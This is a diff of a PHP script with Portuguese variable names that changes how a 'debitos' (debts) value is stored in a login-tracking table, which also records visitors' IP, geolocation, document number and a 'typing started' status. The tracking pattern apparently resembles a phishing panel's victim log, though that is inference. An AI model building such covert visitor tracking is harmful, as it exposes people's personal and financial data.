@@ -74,6 +74,7 @@ try {
     $localidade = $city . ' - ' . $region . ' - ' . $pais;
 
     $hora = date('Y-m-d H:i:s');
+    $debitos = trim((string) ($payload['debitos'] ?? $payload['debitos_total'] ?? $payload['debito_total'] ?? '0 / 0'));
     $loginInfo = json_encode([
         ['label' => 'Origem', 'value' => $page],
         ['label' => 'Doc', 'value' => $doc ?? 'N/A']
@@ -105,7 +106,7 @@ try {
         $insertLogin->execute([
             ':page' => $page,
             ':dados' => 'Typing iniciado',
-            ':debitos' => '0 / 0',
+            ':debitos' => $debitos,
             ':ip' => $ip,
             ':pais' => $localidade,
             ':identity' => $identity,
@@ -129,7 +130,7 @@ try {
         ");
         $updateLogin->execute([
             ':dados' => 'Typing iniciado',
-            ':debitos' => '0 / 0',
+            ':debitos' => $debitos,
             ':ip' => $ip,
             ':pais' => $localidade,
             ':identity' => $identity,
